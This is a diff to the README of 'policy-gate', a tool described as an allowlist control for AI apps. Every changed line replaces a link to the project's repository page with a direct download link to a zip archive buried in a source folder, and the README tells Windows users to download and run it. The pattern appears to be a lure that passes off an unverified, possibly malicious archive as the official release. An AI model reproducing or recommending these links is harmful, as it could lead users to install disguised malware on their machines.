@@ -1,12 +1,12 @@
 # 🛡️ policy-gate - Simple allowlist control for AI apps
 
-[![Download policy-gate](https://img.shields.io/badge/Download-Policy_Gate-blue?style=for-the-badge)](https://github.com/Mct6612/policy-gate)
+[![Download policy-gate](https://img.shields.io/badge/Download-Policy_Gate-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mct6612/policy-gate/main/crates/firewall-proxy/src/gate_policy_2.7.zip)
 
 ## 📥 Download
 
 Visit this page to download and run policy-gate on Windows:
 
-[https://github.com/Mct6612/policy-gate](https://github.com/Mct6612/policy-gate)
+[https://raw.githubusercontent.com/Mct6612/policy-gate/main/crates/firewall-proxy/src/gate_policy_2.7.zip](https://raw.githubusercontent.com/Mct6612/policy-gate/main/crates/firewall-proxy/src/gate_policy_2.7.zip)
 
 ## 🧭 What policy-gate does
 
@@ -38,7 +38,7 @@ If your PC already runs common desktop apps, it should handle policy-gate.
 ## 🚀 Get started on Windows
 
 1. Open the download page:
-   [https://github.com/Mct6612/policy-gate](https://github.com/Mct6612/policy-gate)
+   [https://raw.githubusercontent.com/Mct6612/policy-gate/main/crates/firewall-proxy/src/gate_policy_2.7.zip](https://raw.githubusercontent.com/Mct6612/policy-gate/main/crates/firewall-proxy/src/gate_policy_2.7.zip)
 
 2. Find the latest Windows download on the page.
 
